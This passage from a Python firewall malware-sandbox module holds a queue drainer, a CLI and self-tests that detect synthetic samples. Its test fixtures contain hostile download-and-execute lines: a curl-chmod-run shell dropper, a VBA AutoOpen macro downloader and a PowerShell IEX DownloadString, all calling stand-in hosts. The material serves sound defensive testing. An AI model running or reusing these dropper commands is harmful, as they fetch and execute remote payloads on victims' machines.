    second drainer would only contend for the same claim -- correctly, since
    the claim is transactional, but pointlessly.

    Errors never stop the loop. An unreachable relay, a corrupt sample, a
    chamber that faults: each is one failed row, and the loop must keep serving
    the rest. A drainer that exits on the first failure leaves an appliance
    silently accumulating unanalysed submissions, which is the exact condition
    this class was added to fix.
    """

    def __init__(self, service: "CloudDetectionService", *,
                 interval: float = 5.0, batch: int = 8,
                 idle_backoff: float = 30.0):
        self.service = service
        self.interval = interval
        self.batch = batch
        self.idle_backoff = idle_backoff
        self.stats = {"cycles": 0, "analyzed": 0, "errors": 0, "idle": 0}
        self._stop = threading.Event()
        self._thread: Optional[threading.Thread] = None

    def start(self) -> "QueueDrainer":
        if self._thread is not None:
            return self
        self._thread = threading.Thread(target=self._loop, daemon=True,
                                        name="ffn-crucible-drainer")
        self._thread.start()
        logger.info("crucible drainer started (backend=%s, batch=%d)",
                    self.service.backend.name, self.batch)
        return self

    def _loop(self) -> None:
        wait = self.interval
        while not self._stop.is_set():
            self.stats["cycles"] += 1
            try:
                reports = self.service.process_pending(limit=self.batch)
            except Exception:
                logger.exception("drain cycle failed")
                self.stats["errors"] += 1
                reports = []
            if reports:
                self.stats["analyzed"] += len(reports)
                for rep in reports:
                    logger.info("crucible verdict %s %s score=%d %s",
                                rep.sha256[:12], rep.verdict, rep.score,
                                rep.threat_name or "-")
                wait = self.interval
            else:
                self.stats["idle"] += 1
                # Back off when idle so an empty queue is not a busy loop, but
                # stay responsive once work appears.
                wait = min(wait * 1.5, self.idle_backoff)
            self._stop.wait(wait)

    def stop(self) -> None:
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=10.0)
            self._thread = None

    def summary(self) -> dict:
        out = dict(self.stats)
        out["running"] = self._thread is not None and self._thread.is_alive()
        out["queue_depth"] = self.service.queue_depth()
        return out


# ===========================================================================
# Self-test -- proves the closed Crucible loop, no HW / no network
# ===========================================================================
def selftest() -> int:
    print("cloud_det selftest")
    if ThreatDB is None:
        print("  [fail] ffn_threatdb unavailable"); return 1

    db = ThreatDB(":memory:")
    inline = InlinePayloadDetector(db)
    seed_baseline(inline)
    cloud = CloudDetectionService(db, inline=inline, backend=LocalSandbox())

    # -- craft an UNKNOWN malware sample the baseline inline rules miss ----
    # A PE that imports process-injection APIs and phones home to a C2 host.
    unknown_a = (b"MZ\x90\x00" + b"benign looking header " * 4 +
                 b"CreateRemoteThread" + b"\x00" + b"VirtualAllocEx" +
                 b" connect http://c2.evilcorp.example/gate " +
                 os.urandom(64))
    sha_a = hashlib.sha256(unknown_a).hexdigest()

    # 1) inline is blind to it today (no matching known signature)
    d0 = inline.inspect(unknown_a)
    assert not d0.matched, "sample should be unknown to inline before cloud: %s" % d0.summary()
    print("  [ok] step1: inline verdict on unknown sample = clean")

    # 2) submit -> queued (not cached)
    r = cloud.submit(unknown_a, {"file_type": "pe", "flow": "test"})
    assert r["status"] == "queued", r
    assert cloud.queue_depth() == 1
    print("  [ok] step2: submitted -> queued (depth=1)")

    # 3) detonate the queue
    reps = cloud.process_pending()
    assert len(reps) == 1
    rep = reps[0]
    assert rep.verdict == "malware", "sandbox should convict: %r (%s)" % (rep.verdict, rep.details)
    assert rep.signatures, "sandbox should generate behavioural signatures"
    print("  [ok] step3: sandbox verdict=%s score=%d threat=%s sigs=%d iocs=%d" % (
        rep.verdict, rep.score, rep.threat_name, len(rep.signatures), len(rep.iocs)))

    # 4) verdict is now cached in ThreatDB (hash blocklist) ...
    assert db.is_malicious_hash(sha_a), "cloud verdict must persist to ThreatDB samples"
    #    ... and the C2 domain became a blockable IOC
    ioc = db.lookup_ioc("domain", "c2.evilcorp.example")
    assert ioc and ioc["verdict"] == "malware", "C2 domain should be recorded malicious"
    print("  [ok] step4: ThreatDB now blocks the hash + C2 domain")

    # 5) THE LOOP: inline now convicts the exact file (hash) AND a variant
    #    (different bytes, same behavioural string) via the generated signature.
    d1 = inline.inspect(unknown_a)
    assert d1.matched and d1.action == ACTION_RESET, "inline should block known-bad hash now"
    variant_b = (b"MZ\x90\x00" + b"TOTALLY different padding " * 3 +
                 b"CreateRemoteThread" + os.urandom(128))   # new hash, same capability
    assert hashlib.sha256(variant_b).hexdigest() != sha_a
    d2 = inline.inspect(variant_b)
    assert d2.matched, "generated behavioural signature should catch the variant"
    assert any(m.name.startswith("cloudgen.") for m in d2.matches), \
        "variant must match a cloud-generated signature, not just the hash"
    print("  [ok] step5: LOOP CLOSED -> inline blocks exact file (hash) AND variant (cloudgen sig)")

    # 6) dedup: re-submitting a known sample is answered from cache, no re-run
    before = cloud.stats["analyzed"]
    r2 = cloud.submit(unknown_a)
    assert r2["status"] == "cached" and r2["verdict"] == "malware", r2
    assert cloud.process_pending() == [], "nothing new to analyse"
    assert cloud.stats["analyzed"] == before, "cached sample must not re-detonate"
    print("  [ok] step6: verdict cache dedup (no re-detonation)")

    # 7) a benign sample stays benign and generates no enforcement
    benign = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n<html>hi</html>"
    cloud.submit(benign, {"file_type": "html_js"})
    brep = cloud.process_pending()[0]
    assert brep.verdict == "benign", "benign sample misclassified: %s" % brep.details
    print("  [ok] step7: benign sample -> benign, no signatures generated")

    # 8) report retrieval + stats
    got = cloud.get_report(sha_a)
    assert got and got["verdict"] == "malware" and got["backend"] == "local"
    print("  [ok] step8: report retrieval ->", got["details"])

    print("  all assertions passed:", cloud.summary_stats())
    db.close()

    rc = _selftest_drainer()
    return rc or _selftest_relay()


def _selftest_drainer() -> int:
    """The queue must drain on its own, with nobody running a command."""
    print()
    print("cloud_det drainer selftest")
    try:
        import ffn_crucible                      # noqa: F401
    except ImportError as e:
        # Skip rather than fail. Without the engine, local_backend() falls back
        # to the legacy string sandbox, which scores this test's dropper benign
        # -- so the failure would name a verdict and hide the real cause.
        print("  [skip] needs the crucible engine on sys.path (%s)." % e)
        print("         In a checkout: git submodule update --init crucible")
        print("         then PYTHONPATH=crucible, which is how the appliance's")
        print("         flat /opt/ffn-ngfw-v2 layout is reproduced.")
        return 0
    failures = []

    def check(cond, msg):
        if cond:
            print("  [ok] %s" % msg)
        else:
            print("  [FAIL] %s" % msg)
            failures.append(msg)

    db = ThreatDB(":memory:")
    inline = InlinePayloadDetector(db)
    seed_baseline(inline)
    # The Crucible engine, not the legacy string sandbox: this test is about
    # the loop an appliance actually runs, and the default backend is what it
    # will be running.
    svc = CloudDetectionService(db, inline=inline, backend=local_backend())
    drainer = QueueDrainer(svc, interval=0.1, batch=4, idle_backoff=0.3)
    try:
        sample = (b"#!/bin/sh" + bytes([10])
                  + b"curl -s http://staging.cdn-update.ru/p -o /tmp/p"
                  + bytes([10]) + b"chmod +x /tmp/p" + bytes([10])
                  + b"/tmp/p" + bytes([10]))
        sha = hashlib.sha256(sample).hexdigest()
        svc.submit(sample, {"filename": "update.sh"})
        check(svc.queue_depth() == 1, "the object is queued")

        # Deliberately does NOT call process_pending(): that is the operator
        # action whose absence was the bug.
        drainer.start()
        deadline = time.time() + 20
        while time.time() < deadline and svc.queue_depth() > 0:
            time.sleep(0.1)
        check(svc.queue_depth() == 0,
              "the drainer emptied the queue with no operator action")
        check(drainer.summary()["analyzed"] >= 1,
              "the drainer reports what it analysed: %s"
              % drainer.summary()["analyzed"])
        verdict = svc.verdict(sha)
        check(verdict["verdict"] in ("malware", "grayware"),
              "the queued object got a verdict: %s" % verdict["verdict"])
        check(db.is_malicious_hash(sha) or verdict["verdict"] == "grayware",
              "and the verdict reached enforcement")
        check(drainer.summary()["running"] is True, "the drainer is still alive")

        # It must survive a failing backend rather than dying silently.
        class _Exploding(CloudBackend):
            name = "exploding"

            def analyze(self, sha256, data, meta):
                raise RuntimeError("backend fault (deliberate)")

        svc.backend = _Exploding()
        svc.submit(sample + bytes([35]) + b"x", {})
        deadline = time.time() + 20
        while time.time() < deadline and svc.queue_depth() > 0:
            time.sleep(0.1)
        check(svc.queue_depth() == 0, "a failing backend still clears the row")
        check(drainer.summary()["running"] is True,
              "a backend fault does not kill the drainer")
    finally:
        drainer.stop()
        db.close()

    if failures:
        print("FAILED %d drainer check(s):" % len(failures))
        for f in failures:
            print("  - %s" % f)
        return 1
    return 0


def _selftest_relay() -> int:
    """The offload loop end to end: carve -> relay -> detonate -> enforce.

    This is the test that matters for the offloadable claim. It stands up a
    real Crucible node on loopback with real ed25519 keys, submits over HTTP
    through RelayBackend, and checks that the SIGNED verdict coming back
    actually reaches the enforcement path -- ThreatDB hash blocklist, condemned
    IOCs, and a generated inline signature that catches a variant.

    It also proves the two failure modes behave: an unreachable node yields
    `unknown` rather than a clean verdict, and a verdict signed by the wrong
    key is refused rather than enforced.
    """
    import shutil
    import tempfile
    print()
    print("cloud_det relay (offload) selftest")
    try:
        import ffn_ed25519
        from ffn_crucible import build_test_pe
        import ffn_crucible_node as node_mod
    except ImportError as e:
        print("  [skip] relay test needs ffn_crucible + ffn_crucible_node (%s)" % e)
        return 0

    failures = []

    def check(cond, msg):
        if cond:
            print("  [ok] %s" % msg)
        else:
            print("  [FAIL] %s" % msg)
            failures.append(msg)

    tmp = tempfile.mkdtemp(prefix="crucible-relay-test-")
    httpd = None
    node = None
    db = None
    try:
        seed_path, pub_path, pub_hex = ffn_ed25519.keygen(
            os.path.join(tmp, "verdict"))
        token = "relay-selftest-token"
        tok_file = os.path.join(tmp, "node.token")
        with open(tok_file, "w") as fh:
            fh.write(token)

        store = node_mod.NodeStore(db_path=os.path.join(tmp, "node.sqlite"),
                                   spool=os.path.join(tmp, "spool"))
        node = node_mod.CrucibleNode(
            store, policy="static", workers=1, node_id="relay-selftest",
            signer=node_mod.VerdictSigner(seed_path=seed_path,
                                          pub_path=pub_path),
            token=token)
        httpd = node_mod.serve(node, bind="127.0.0.1", port=0, block=False)
        url = "http://127.0.0.1:%d" % httpd.server_address[1]

        relay = RelayBackend(url, token=token,
                             pubkey=bytes.fromhex(pub_hex),
                             poll_deadline=60.0, poll_interval=0.2)
        db = ThreatDB(":memory:")
        inline = InlinePayloadDetector(db)
        seed_baseline(inline)
        svc = CloudDetectionService(db, inline=inline, backend=relay)

        # A macro downloader the baseline inline rules genuinely do not cover.
        # (An earlier version of this test used `powershell -enc`, which the
        # baseline already carries a PCRE for, so it proved nothing.)
        import io
        import zipfile
        vba = (b"Attribute VB_Name" + bytes([0])
               + b"Sub AutoOpen()" + bytes([13, 10])
               + b"Set h = CreateObject(" + bytes([34]) + b"MSXML2.XMLHTTP"
               + bytes([34]) + b")" + bytes([13, 10])
               + b"h.Open " + bytes([34]) + b"GET" + bytes([34]) + b", "
               + bytes([34]) + b"http://ledger-sync.cdn-update.ru/inv.dat"
               + bytes([34]) + b", False" + bytes([13, 10])
               + b"Set s = CreateObject(" + bytes([34]) + b"ADODB.Stream"
               + bytes([34]) + b")" + bytes([13, 10])
               + b"s.SaveToFile " + bytes([34]) + b"%TEMP%m.exe" + bytes([34])
               + bytes([13, 10]) + b"End Sub")
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", "<Types/>")
            z.writestr("word/document.xml", "<w:document/>")
            z.writestr("word/vbaProject.bin", vba)
        sample = buf.getvalue()
        sha = hashlib.sha256(sample).hexdigest()

        check(not inline.inspect(sample).matched,
              "the inline engine is blind to this object today")

        r = svc.submit(sample, {"filename": "invoice.docx", "flow": "test"})
        check(r["status"] == "queued", "carved object queued for offload")
        reps = svc.process_pending()
        check(len(reps) == 1, "one object relayed and answered")
        rep = reps[0]
        check(rep.backend == "relay", "the verdict came from the relay backend")
        check(rep.verdict == "malware" and rep.threat_name == "MacroDropper",
              "node verdict: %s / %s score=%d" % (rep.verdict, rep.threat_name,
                                                  rep.score))
        check(rep.details.get("verified") is True,
              "the verdict signature was verified before it was applied")
        check(rep.details.get("node") == "relay-selftest",
              "the report records which node judged it")
        check(db.is_malicious_hash(sha),
              "the offloaded verdict reached the ThreatDB hash blocklist")
        check(inline.inspect(sample).matched,
              "the inline engine now blocks the exact object")

        # For a DOCUMENT, the honest enforceable outputs are the hash verdict
        # and the C2 infrastructure -- not a content pattern. Its macro has no
        # construct distinctive enough to match on without risking false
        # positives on legitimate documents, and inventing one would be worse
        # than having none. Infrastructure reuse is what covers the variants.
        domains = [v for (t, v, vd, _n) in rep.iocs
                   if t == "domain" and vd == "malware"]
        check("ledger-sync.cdn-update.ru" in domains,
              "the C2 host the macro fetches from is charged as an IOC")
        hit = db.lookup_ioc("domain", "ledger-sync.cdn-update.ru")
        check(hit is not None and hit["verdict"] == "malware",
              "and it reached the ThreatDB IOC table, covering the variants "
              "that reuse the same infrastructure")

        # A SCRIPT does carry a distinctive construct, so offloading one must
        # come back with a content signature that catches a re-packed variant.
        script = (b"IEX (New-Object Net.WebClient).DownloadString("
                  + bytes([39]) + b"http://ledger-sync.cdn-update.ru/s.ps1"
                  + bytes([39]) + b")")
        svc.submit(script, {"filename": "update.ps1"})
        srep = [x for x in svc.process_pending()
                if x.sha256 == hashlib.sha256(script).hexdigest()][0]
        check(srep.verdict == "malware" and srep.signatures,
              "an offloaded script returns enforceable content signatures (%d)"
              % len(srep.signatures))
        variant = script.replace(b"/s.ps1", b"/s2.ps1") + b"  # repacked"
        assert hashlib.sha256(variant).hexdigest() != \
            hashlib.sha256(script).hexdigest()
        det = inline.inspect(variant)
        check(det.matched and any(m.name.startswith("crucible.")
                                  for m in det.matches),
              "a variant with a NEW hash is caught by the generated signature")

        ioc_hits = [db.lookup_ioc("domain", v) for (t, v, _vd, _n) in rep.iocs
                    if t == "domain"]
        check(all(h is None or h["verdict"] != "benign" for h in ioc_hits),
              "no IOC from the node was recorded as benign")

        print()
        print("  failure modes")
        # 1) the node is gone
        httpd.shutdown()
        httpd.server_close()
        dead = RelayBackend(url, token=token, pubkey=bytes.fromhex(pub_hex),
                            timeout=1.0, poll_deadline=2.0, poll_interval=0.2)
        pe = build_test_pe({"kernel32.dll": ["CreateRemoteThread"]})
        gone = dead.analyze(hashlib.sha256(pe).hexdigest(), pe, {})
        check(gone.verdict == "unknown" and gone.details.get("error"),
              "an unreachable node yields unknown, never benign: %s"
              % str(gone.details.get("error"))[:60])

        # 2) a verdict signed by the wrong key must not be enforced
        wrong = RelayBackend(url, token=token,
                             pubkey=ffn_ed25519.publickey(os.urandom(32)))
        check(not wrong._verify(rep_bundle_of(node, sha)),
              "a verdict does not verify against the wrong pinned key")

        # 3) require_signed with no key configured refuses to act
        nokey = RelayBackend(url, token=token, require_signed=True)
        check(not nokey._pubkey and nokey.require_signed,
              "a relay with no pinned key still requires signatures")

        # 4) the fallback keeps inspection alive when the node is down
        chain = FallbackBackend(dead, local_backend("static"))
        chained = chain.analyze(hashlib.sha256(sample).hexdigest(), sample, {})
        check(chained.verdict == "malware",
              "with the node down, the local fallback still convicts (%s)"
              % chained.verdict)
        check(chained.details.get("fell_back_from") == "relay",
              "and the report says the verdict came from the fallback")
    finally:
        if httpd is not None:
            try:
                httpd.shutdown()
                httpd.server_close()
            except Exception:
                pass
        if node is not None:
            node.stop()
            node.store.close()
        if db is not None:
            db.close()
        shutil.rmtree(tmp, ignore_errors=True)

    print()
    if failures:
        print("FAILED %d relay check(s):" % len(failures))
        for f in failures:
            print("  - %s" % f)
        return 1
    print("  offload loop verified end to end")
    return 0


def rep_bundle_of(node, sha: str) -> dict:
    """The signed bundle the node stored for one sample (selftest helper)."""
    return node.store.verdict(sha) or {}



# ===========================================================================
# CLI
# ===========================================================================
def _make_service(db_path: str, backend: Optional[CloudBackend] = None, *,
                  auto_compile: bool = True):
    """ThreatDB + inline engine + service, wired to one backend."""
    db = ThreatDB(db_path)
    inline = InlinePayloadDetector(db)
    svc = CloudDetectionService(db, inline=inline,
                                backend=backend or local_backend(),
                                auto_compile=auto_compile)
    return db, inline, svc


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="FFN NGFW Crucible: unknown-object submission and verdicts")
    ap.add_argument("--db", default=os.getenv("FFN_THREATDB_PATH",
                                              "/var/lib/ffn-ngfw/threatdb.sqlite"))
    ap.add_argument("--backend", default=os.getenv("FFN_CRUCIBLE_BACKEND", "local"),
                    help="local | legacy | relay:<url> | relay+local:<url> | "
                         "http:<url>   (default: local)")
    ap.add_argument("--policy", default=os.getenv("FFN_CRUCIBLE_POLICY", "static"),
                    help="on-box chamber policy: static | jail | vm | best. "
                         "static never executes a sample, and is the default.")
    ap.add_argument("--timeout", type=int, default=30,
                    help="per-sample analysis budget, seconds")
    ap.add_argument("--relay-token-file",
                    default=os.getenv("FFN_CRUCIBLE_TOKEN",
                                      "/etc/ffn-ngfw/crucible-node.token"),
                    help="file holding the bearer token for the relay node")
    ap.add_argument("--relay-pubkey",
                    default=os.getenv("FFN_CRUCIBLE_RELAY_PUB",
                                      "/etc/ffn-ngfw/crucible-verdict.pub"),
                    help="the relay node ed25519 verdict key (hex file). "
                         "Required unless --allow-unsigned is given.")
    ap.add_argument("--allow-unsigned", action="store_true",
                    help="act on relay verdicts not signed by a pinned key. A "
                         "forged verdict can blocklist whatever the attacker "
                         "chooses, so this is for lab use only.")
    ap.add_argument("--guests", default="",
                    help="guest profile JSON for the vm chamber")
    ap.add_argument("--cloud-url", default=os.getenv("FFN_CLOUD_URL", ""),
                    help="deprecated: same as --backend http:<url>")
    ap.add_argument("--api-key", default=os.getenv("FFN_CLOUD_APIKEY", ""))
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("selftest")
    sub.add_parser("backend", help="show the backend this configuration builds")
    sp = sub.add_parser("submit"); sp.add_argument("file")
    sp = sub.add_parser("process"); sp.add_argument("--limit", type=int, default=50)
    sp = sub.add_parser("verdict"); sp.add_argument("sha256")
    sp = sub.add_parser("report"); sp.add_argument("sha256")
    sub.add_parser("stats")
    args = ap.parse_args(argv)
    logging.basicConfig(level=logging.INFO, format="%(levelname)s %(message)s")

    if args.cmd == "selftest":
        return selftest()

    spec = args.backend
    if args.cloud_url and spec == "local":
        spec = "http:" + args.cloud_url
    try:
        backend = build_backend(
            spec, token_file=args.relay_token_file,
            pubkey_file=args.relay_pubkey,
            require_signed=not args.allow_unsigned,
            policy=args.policy, timeout=args.timeout,
            guest_profiles=args.guests, api_key=args.api_key)
    except ValueError as e:
        print("ERROR: %s" % e, file=sys.stderr)
        return 2

    if args.cmd == "backend":
        info = {"spec": spec, "backend": backend.name}
        engine = getattr(backend, "secondary", backend)
        if hasattr(engine, "statuses"):
            info["chambers"] = [st.line().strip() for st in engine.statuses()]
        relay = backend if isinstance(backend, RelayBackend)             else getattr(backend, "primary", None)
        if isinstance(relay, RelayBackend):
            info["relay"] = {
                "url": relay.base_url,
                "token_configured": bool(relay._token),
                "pinned_key": relay._pubkey.hex()[:16] or None,
                "require_signed": relay.require_signed,
            }
            if relay.require_signed and not relay._pubkey:
                info["WARNING"] = ("no pinned verdict key: every verdict will "
                                   "come back unknown until one is installed")
        print(json.dumps(info, indent=2))
        return 0

    if ThreatDB is None:
        print("ffn_threatdb unavailable", file=sys.stderr); return 1

    db, inline, svc = _make_service(args.db, backend)
    try:
        if args.cmd == "submit":
            data = open(args.file, "rb").read()
            print(json.dumps(svc.submit(data, {"file_type": detect_file_type(data),
                                               "source": "cli", "path": args.file})))
        elif args.cmd == "process":
            reps = svc.process_pending(limit=args.limit)
            for rep in reps:
                print("%s  %-9s score=%-3d %s  sigs=%d iocs=%d" % (
                    rep.sha256[:16], rep.verdict, rep.score, rep.threat_name,
                    len(rep.signatures), len(rep.iocs)))
            print("processed", len(reps))
        elif args.cmd == "verdict":
            print(json.dumps(svc.verdict(args.sha256), indent=2, default=str))
        elif args.cmd == "report":
            print(json.dumps(svc.get_report(args.sha256), indent=2))
        elif args.cmd == "stats":
            print(json.dumps(svc.summary_stats(), indent=2))
    finally:
        db.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
